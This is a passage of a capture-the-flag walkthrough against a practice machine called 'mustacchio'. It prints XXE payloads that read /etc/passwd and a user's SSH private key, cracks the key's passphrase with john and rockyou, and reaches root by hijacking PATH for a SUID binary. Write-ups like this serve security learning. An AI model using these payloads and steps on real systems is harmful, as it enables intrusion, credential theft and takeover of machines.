[&lt;!ENTITY test \"Doe\"&gt; ]&gt;&lt;comment&gt; &lt;name&gt;john&lt;/name&gt; &lt;author&gt;blah&lt;/author&gt; &lt;com&gt;&amp;test;&lt;/com&gt;&lt;/comment&gt;In the output, we see Comment: Doe. Our injection did work. Now lets grab /etc/passwd as usaul :D&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data ANY &gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;comment&gt; &lt;name&gt;john&lt;/name&gt; &lt;author&gt;abc&lt;/author&gt; &lt;com&gt;&amp;xxe;&lt;/com&gt;&lt;/comment&gt;We got our file. From the comment in source code, we know that barry can ssh into the machine. So let’s try to grab barry’s ssh key.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data ANY &gt;&lt;!ENTITY xxe SYSTEM \"file:///home/barry/.ssh/id_rsa\" &gt;]&gt;&lt;comment&gt; &lt;name&gt;john&lt;/name&gt; &lt;author&gt;abc&lt;/author&gt; &lt;com&gt;&amp;xxe;&lt;/com&gt;&lt;/comment&gt;We got the key but it was incrypted. Running ssh2john, we got the hash. After running johnjohn hash --wordlist=/usr/share/wordlists/rockyou.txt...[snip]...urieljames (barry)...[snip]...We can now ssh into the box using key and passphrase we found and grab user.txtROOTThere were two users on the box, barry and joe. Since we dont have any password for barry, sudo -l failed. After looking for a while to switch to Joe user, didn’t find anything. Looking at Joe’s home dir, it hadbarry@mustacchio:/home/joe$ ls -ltotal 20-rwsr-xr-x 1 root root 16832 Jun 12 15:48 live_logThe binary was owned by root and had SUID bit set on it. Let’s run the binary, it seems to return live webserver’s logs. As it was a binary not stripped, first step, look at stings. We foundtail -f /var/log/nginx/access.log. The binary was using tail binary but it was not using full path of the binary. So we can try path hijack.Creating a file named tail in /tmp directory.#!/bin/bashchmod +xs /bin/bashChange the PATH env variable, and execute the file. After executing, we can see /bin/bash now have suid bit set on it. Now, simply /bin/bash -p and we are root." } ]
